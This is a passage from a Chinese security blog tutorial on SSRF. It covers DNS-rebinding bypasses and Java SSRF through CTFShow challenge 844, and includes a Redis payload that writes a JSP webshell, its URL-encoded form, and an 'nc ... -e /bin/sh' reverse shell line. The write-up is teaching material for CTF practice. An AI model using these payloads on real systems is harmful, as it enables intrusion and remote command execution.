+<p>1.判定你给的 IP 或者域名解析后的 IP 是否在黑名单中<br>2.若在，退出报错<br>3.若不在，再次访问你给的 IP 或者域名解析后的 IP；执行后续业务模块</p>
+<p>所以思路很简单：你只需要有个域名，但是它映射两个 IP；同时设置 TTL 为 0，能方便两个 IP 即刻切换。</p>
+<p>效果类比：你访问 <code>wwfcww.xyz</code> 这个域名，第一次解析的 IP 是 192.168.0.1；而第二次解析的IP是 127.0.0.1，如此一来即可进行 SSRF 攻击。</p>
+<h2 id="0x06-SSRF-in-Java"><a href="#0x06-SSRF-in-Java" class="headerlink" title="0x06 SSRF in Java"></a>0x06 SSRF in Java</h2><h3 id="Java-中-SSRF-的存在性"><a href="#Java-中-SSRF-的存在性" class="headerlink" title="Java 中 SSRF 的存在性"></a>Java 中 SSRF 的存在性</h3><ul>
+<li>这里和 PHP 相差还是有多大的，首先是协议问题，由于 Java 没有 php 的 cURL，所以 Java SSRF 支持的协议，不能像 php 使用 <code>curl -V</code> 查看。</li>
+</ul>
+<p>然后 Java 里面的 SSRF，本质上其实和 PHP 一样，就是建立 URL 连接的原理</p>
+<p>从<code>import sun.net.www.protocol</code>可以看到，支持以下协议</p>
+<pre class="line-numbers language-none"><code class="language-none">file ftp mailto http https jar netdoc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<blockquote>
+<p>然后也看到了一些师傅的总结吧，感觉有些地方不是特别准确，具体的其实代码审计一看就清晰了。</p>
+</blockquote>
+<p>一般是需要有 URL 这种，然后建立 URLConnection，代码可以是如下 ———— 参考 CTFShow 844</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">goPage</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span> <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span> param<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  
+    <span class="token class-name">String</span> result <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>  
+ <span class="token class-name">String</span> request <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>  
+ <span class="token class-name">String</span> url <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span>param<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+ <span class="token class-name">String</span> port <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span>param<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"port"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+ <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">null</span> <span class="token operator">!=</span> url <span class="token operator">&amp;&amp;</span> <span class="token keyword">null</span> <span class="token operator">!=</span> param <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>param<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  
+        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>  
+            <span class="token class-name">Socket</span> socket <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Socket</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+ <span class="token class-name">OutputStream</span> out <span class="token operator">=</span> socket<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            
+            
+………… 后续内容省略
+    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<p>这里就建立了 Socket 请求，也就是网络请求，所以存在 SSRF。</p>
+<h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><p>Java SSRF 的攻击手段和 PHP 的类似，都是写入 shell，或者直接打 Redis 未授权，但是 PHP 的那个脚本，在 Java 里面用不了，所以这一块稍微总结一下写入 shell 的攻击手段。</p>
+<p>还是以 CTFShow 844 为例，要发包的接口是 &#x2F;goPage；两个参数 url 和 port。尝试访问 6379 端口，发现可行。尝试写 shell</p>
+<img src="/2022/05/16/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1SSRF/844Socket.png" class="">
+
+<p>这里的 payload</p>
+<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">config&#x3D; set dir &#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;ROOT&#x2F;&amp;config set dbfilename 1.jsp&amp;set xx &#39;&lt;%Runtime.getRuntime().exec(new String[]&#123;&quot;sh&quot;,&quot;-c&quot;,request.getParameter(&quot;i&quot;)&#125;);%&gt;&#39;&amp;save&#x3D;&amp;quit&#x3D;&amp;url&#x3D;127.0.0.1&amp;port&#x3D;6379<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>进行一下 url 编码之后打</p>
+<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">goPage?config&#x3D;%20set%20dir%20&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;ROOT&#x2F;&amp;config%20set%20dbfilename%201.jsp&amp;set%20xx%20&#39;%3C%25Runtime.getRuntime().exec(new%20String%5B%5D%7B%22sh%22%2C%22-c%22%2Crequest.getParameter(%22i%22)%7D)%3B%25%3E&#39;&amp;save&#x3D;&amp;quit&#x3D;&amp;url&#x3D;127.0.0.1&amp;port&#x3D;6379<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<img src="/2022/05/16/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1SSRF/844WriteInShell.png" class="">
+
+<p>然后完成弹 shell</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">1</span>.jsp?i<span class="token operator">=</span>nc xxx.xx.xx.xx <span class="token number">3333</span> -e /bin/sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="0x07-小结"><a href="#0x07-小结" class="headerlink" title="0x07 小结"></a>0x07 小结</h2><p>SSRF 整体上来说入门并不难，难的是在实战渗透当中想到这么做。利用 SSRF-Lab 可以省去自己搭环境的时间。</p>
+<ul>
+<li>对于 CTF 选手来说，SSRF 的绕过手段，尤其是 DNS 重绑这个绕过方式挺厉害的，建议学习。</li>
+</ul>
+<h2 id="0x08-参考资料"><a href="#0x08-参考资料" class="headerlink" title="0x08 参考资料"></a>0x08 参考资料</h2><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/262430">https://www.anquanke.com/post/id/262430</a><br><a target="_blank" rel="noopener" href="https://se8s0n.github.io/2019/05/19/SSRF-LABS%E6%8C%87%E5%8D%97/">https://se8s0n.github.io/2019/05/19/SSRF-LABS%E6%8C%87%E5%8D%97/</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7333">https://xz.aliyun.com/t/7333</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/260806.html">https://www.freebuf.com/articles/web/260806.html</a></p>
+
+            </div>
+
+            
+                <div class="post-copyright-info">
+                    
+<div class="article-copyright-info-container">
+    <ul class="copyright-info-content">
+        <li class="post-title">
+            <span class="type">本文标题</span>：<span class="content">从0到1完全掌握SSRF</span>
+        </li>
+        <li class="post-author">
+            <span class="type">本文作者</span>：<span class="content">Drunkbaby</span>
+        </li>
+        <li class="post-time">
+            <span class="type">创建时间</span>：<span class="content">2022-05-16 12:29:04</span>
+        </li>
+        <li class="post-link">
+            <span class="type">本文链接</span>：<span class="content">2022/05/16/从0到1完全掌握SSRF/</span>
+        </li>
+        <li class="post-license">
+            <span class="type">版权声明</span>：<span class="content">本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！</span>
+        </li>
+    </ul>
+    <div class="copy-copyright-info flex-center tooltip" data-content="复制版权信息" data-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                </div>
+            
+
+            
+                <ul class="post-tags-box">
+                    
+                        <li class="tag-item">
+                            <a href="/tags/%E4%BB%8E0%E5%88%B01/">#从0到1</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            
+
+            
+                <div class="article-nav">
+                    
+                        <div class="article-prev">
+                            <a class="prev"
+                               rel="prev"
+                               href="/2022/05/16/SSRF-Lab%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"
+                            >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                                <span class="title flex-center">
+                                <span class="post-nav-title-item">SSRF-Lab环境搭建</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                            </a>
+                        </div>
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                               rel="next"
+                               href="/2022/05/14/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%94%A8docker%E9%83%A8%E7%BD%B2Springboot%E7%9A%84%E7%BB%8F%E5%8E%86/"
+                            >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">记一次用docker部署Springboot的经历</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                                <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+            
+                <div class="comment-container">
+                    
+<div class="comments-container">
+    <div id="comments-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fas fa-comments"></i>&nbsp;评论
+    </div>
+    
+        
+            
+
+    <div class="valine-container">
+        <script data-pjax src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
+        <div id="vcomments"></div>
+        <script data-pjax>
+          function loadValine() {
+
+            const config = {
+              el: '#vcomments',
+              appId: 'mCIu9X4iLP3I0GikUoetB9bV-9Nh9j0Va',
+              appKey: 'ermlV1eoB1YODT088EdXjo6C',
+              meta: ['nick', 'mail', 'link'],
+              avatar: 'wavatar',
+              enableQQ: true,
+              placeholder: 'just go go',
+              lang: 'zh-CN'.toLowerCase()
+            }
+
+            if ('') {
+              config.serverURLs = ''
+            }
+
+            new Valine(config)
+
+            function getAuthor(language) {
+              switch (language) {
+                case 'en':
+                  return 'Author'
+                case 'zh-CN':
+                  return '博主'
+                default:
+                  return 'Master'
+              }
+            }
+
+            // Add "Author" identify
+            const getValineDomTimer = setInterval(() => {
+              const vcards = document.querySelectorAll('#vcomments .vcards .vcard')
+              if (vcards.length > 0) {
+                let author = 'Drunkbaby'
+
+                if (author) {
+                  for (let vcard of vcards) {
+                    const vnick_dom = vcard.querySelector('.vhead .vnick')
+                    const vnick = vnick_dom.innerHTML
+                    if (vnick === author) {
+                      vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
+                    }
+                  }
+                }
+                clearInterval(getValineDomTimer)
+              } else {
+                clearInterval(getValineDomTimer)
+              }
+            }, 2000)
+          }
+
+          if ('true' === 'true') {
+            const loadValineTimeout = setTimeout(() => {
+              loadValine()
+              clearTimeout(loadValineTimeout)
+            }, 1000)
+          } else {
+            window.addEventListener('DOMContentLoaded', loadValine)
+          }
+        </script>
+    </div>
+
+
+
+        
+    
+</div>
+
+                </div>
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1-SSRF"><span class="nav-text">从0到1完全掌握 SSRF</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="nav-text">0x01 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E7%9F%A5%E5%85%B6%E7%84%B6%EF%BC%9A%E4%BB%80%E4%B9%88%E6%98%AF-SSRF"><span class="nav-text">0x02 知其然：什么是 SSRF?</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-SSRF-%E7%9A%84%E5%8E%9F%E7%90%86"><span class="nav-text">0x03 SSRF 的原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-SSRF-%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="nav-text">0x04 SSRF 的利用方式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SSRF-%E5%88%A9%E7%94%A8%E7%9B%B8%E5%85%B3%E7%9A%84%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0"><span class="nav-text">SSRF 利用相关的危险函数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-file-get-contents-%E4%B8%8E-readfile"><span class="nav-text">1. file_get_contents() 与 readfile()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-fsockopen"><span class="nav-text">2. fsockopen()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-curl-exec"><span class="nav-text">3. curl_exec()</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSRF-%E7%9A%84%E5%8D%B1%E9%99%A9%E5%8D%8F%E8%AE%AE"><span class="nav-text">SSRF 的危险协议</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-file-%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8"><span class="nav-text">1. file 协议的利用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-dict-%E5%8D%8F%E8%AE%AE%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="nav-text">2. dict 协议的使用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-gopher-%E5%8D%8F%E8%AE%AE%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="nav-text">3. gopher 协议的使用</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81%E7%9A%84%E7%BB%95%E8%BF%87%E6%89%8B%E6%B3%95"><span class="nav-text">0x05 一些常见的绕过手法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E7%BB%95%E8%BF%87"><span class="nav-text">1. @绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E8%BF%9B%E5%88%B6%E7%BB%95%E8%BF%87"><span class="nav-text">2. 进制绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E7%94%A8%E5%8F%A5%E5%8F%B7%E6%9B%BF%E6%8D%A2-%E2%80%9C-%E2%80%9D"><span class="nav-text">3. 用句号替换 “.”</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-xip-io-%E5%92%8C-xip-name-%E7%BB%95%E8%BF%87"><span class="nav-text">4. xip.io 和 xip.name 绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-DNS-%E9%87%8D%E7%BB%91"><span class="nav-text">5. DNS 重绑</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-SSRF-in-Java"><span class="nav-text">0x06 SSRF in Java</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Java-%E4%B8%AD-SSRF-%E7%9A%84%E5%AD%98%E5%9C%A8%E6%80%A7"><span class="nav-text">Java 中 SSRF 的存在性</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB"><span class="nav-text">攻击</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-%E5%B0%8F%E7%BB%93"><span class="nav-text">0x07 小结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x08-%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="nav-text">0x08 参考资料</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            
+<footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+                <span>2021</span> -
+            
+            2023
+            
+                &nbsp;<i class="fas fa-heart icon-animate"></i>
+                &nbsp;<a href="/">Drunkbaby</a>
+            
+        </div>
+        
+            <script async data-pjax
+                    src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                
+                
+                    总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.6.1</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="tools-item flex-center go-to-comments">
+                <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/dark-light-toggle.js"></script>
+
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/local-search.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/code-block.js"></script>
+
+
+
+
+<div class="post-scripts pjax">
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/post-helper.js"></script>
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/anime.min.js"></script>
+        
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/toc.js"></script>
+        
+    
+</div>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/pjax.min.js"></script>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            KEEP.refresh();
+        });
+    });
+</script>
+
+
+
+</body>
+</html>
